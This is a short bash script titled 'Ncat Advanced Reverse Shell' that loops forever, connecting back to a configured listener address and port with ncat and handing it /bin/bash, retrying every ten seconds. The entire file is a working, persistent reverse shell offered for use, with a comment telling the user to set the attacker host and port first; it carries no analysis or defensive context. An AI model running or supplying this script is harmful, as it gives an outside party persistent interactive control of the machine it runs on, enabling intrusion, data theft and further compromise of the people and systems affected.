#!/bin/bash
# Ncat Advanced Reverse Shell
# Configure LHOST and LPORT before use

LHOST="192.168.1.100"
LPORT=4460

while true; do
    ncat --exec /bin/bash $LHOST $LPORT
    sleep 10
done
